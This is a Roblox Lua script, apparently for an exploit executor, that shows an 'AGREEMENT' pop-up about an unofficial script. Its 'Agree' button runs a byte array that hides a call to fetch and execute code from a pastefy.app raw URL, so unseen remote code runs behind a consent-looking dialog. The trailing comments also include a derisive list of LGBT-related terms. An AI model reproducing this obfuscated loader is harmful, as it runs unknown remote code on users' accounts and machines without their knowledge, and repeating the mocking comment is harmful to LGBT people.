local g00bywarn = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local UICorner = Instance.new("UICorner")
local Title = Instance.new("TextLabel")
local Message = Instance.new("TextLabel")
local Message1 = Instance.new("TextLabel")
local Message2 = Instance.new("TextLabel")
local Message3 = Instance.new("TextLabel")
local ImageButton = Instance.new("ImageButton")
local TextLabel = Instance.new("TextLabel")

g00bywarn.Name = "g00bywarn"
g00bywarn.IgnoreGuiInset = true
g00bywarn.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
g00bywarn.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

Frame.Parent = g00bywarn
Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Frame.BackgroundTransparency = 0.100
Frame.BorderSizePixel = 0
Frame.Position = UDim2.new(0.395900816, 0, 0.376675069, 0)
Frame.Size = UDim2.new(0, 398, 0, 168)

UICorner.Parent = Frame

Title.Name = "Title"
Title.Parent = Frame
Title.BackgroundTransparency = 1
Title.Position = UDim2.new(0.189173013, 0, 0, 0)
Title.Size = UDim2.new(0, 236, 0, 50)
Title.Font = Enum.Font.SourceSans
Title.Text = "AGREEMENT"
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.TextScaled = true
Title.TextWrapped = true

Message.Name = "Message"
Message.Parent = Frame
Message.BackgroundTransparency = 1
Message.Position = UDim2.new(-0.0276381914, 0, -0.00856835488, 0)
Message.Size = UDim2.new(0, 380, 0, 119)
Message.Font = Enum.Font.SourceSans
Message.Text = "THIS IT NOT OFFICIAL SCRIPT"
Message.TextColor3 = Color3.fromRGB(255, 255, 255)
Message.TextSize = 27

Message1.Name = "Message1"
Message1.Parent = Frame
Message1.BackgroundTransparency = 1
Message1.Position = UDim2.new(-0.17336683, 0, 0.140241176, 0)
Message1.Size = UDim2.new(0, 380, 0, 119)
Message1.Font = Enum.Font.SourceSans
Message1.Text = "\"YOU SHOULD NOT POST THE SCRIPT ON SOCIAL MEDIA\"!!"
Message1.TextColor3 = Color3.fromRGB(255, 255, 255)
Message1.TextSize = 27

Message2.Name = "Message2"
Message2.Parent = Frame
Message2.BackgroundTransparency = 1
Message2.Position = UDim2.new(0.304020107, 0, 0.140241176, 0)
Message2.Size = UDim2.new(0, 380, 0, 119)
Message2.Font = Enum.Font.SourceSans
Message2.Text = "THIS IS NOT "
Message2.TextColor3 = Color3.fromRGB(255, 255, 255)
Message2.TextSize = 27

Message3.Name = "Message3"
Message3.Parent = Frame
Message3.BackgroundTransparency = 1
Message3.Position = UDim2.new(0.0226130653, 0, 0.289050698, 0)
Message3.Size = UDim2.new(0, 380, 0, 119)
Message3.Font = Enum.Font.SourceSans
Message3.Text = "OFFICIAL SCRIPT  \"YOU SHOULD NOT POST THE SCRIPT ON SOCIAL MEDIA \"!!"
Message3.TextColor3 = Color3.fromRGB(255, 255, 255)
Message3.TextSize = 24

ImageButton.Parent = Frame
ImageButton.BackgroundTransparency = 1
ImageButton.Position = UDim2.new(0.256361753, 0, 0.744000018, 0)
ImageButton.Size = UDim2.new(0, 182, 0, 36)
ImageButton.Image = "rbxassetid://73795817403144"

TextLabel.Parent = ImageButton
TextLabel.BackgroundTransparency = 1
TextLabel.Position = UDim2.new(-0.0177196469, 0, -0.194445297, 0)
TextLabel.Size = UDim2.new(0, 187, 0, 50)
TextLabel.Font = Enum.Font.SourceSans
TextLabel.Text = "Agree"
TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.TextSize = 25

local function UXBKFY_fake_script()
	local script = Instance.new("LocalScript", Frame)
	local TweenService = game:GetService("TweenService")
	local frame = script.Parent

	local normalPos = frame.Position
	local normalSize = frame.Size

	frame.Position = UDim2.new(0.5, -normalSize.X.Offset/2, 0.5, -normalSize.Y.Offset/2)
	frame.Size = UDim2.new(normalSize.X.Scale, 0, normalSize.Y.Scale, 0)

	TweenService:Create(
		frame,
		TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.Out),
		{Position = normalPos, Size = normalSize}
	):Play()
end
coroutine.wrap(UXBKFY_fake_script)()

local function CEHOU_fake_script()
	local script = Instance.new("LocalScript", ImageButton)

	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.Parent:Destroy()

		local t={108,111,97,100,115,116,114,105,110,103,40,103,97,109,101,58,72,116,116,112,71,101,116,40,34,104,116,116,112,115,58,47,47,112,97,115,116,101,102,121,46,97,112,112,47,71,75,57,108,66,67,48,97,47,114,97,119,34,41,41,40,41}
		local s=""
		for i=1,#t do
			s=s..string.char(t[i])
		end
		loadstring(s)()
	end)
end
coroutine.wrap(CEHOU_fake_script)()
--leak = FEMBOY,GAY,TOMBOY,LES,LGBT...
--Script by Noobd0lan or NoobSigma or Sigma Mango
--Script MercuryOxid ss 
--FAKE SCRIPT IS MADE BY NOOBSIGMA OR NOOBSIGMA OR SIGMA MANG
--PLS NO LEAK
--SCRIPT IS ENCODED
--Unofficial script 
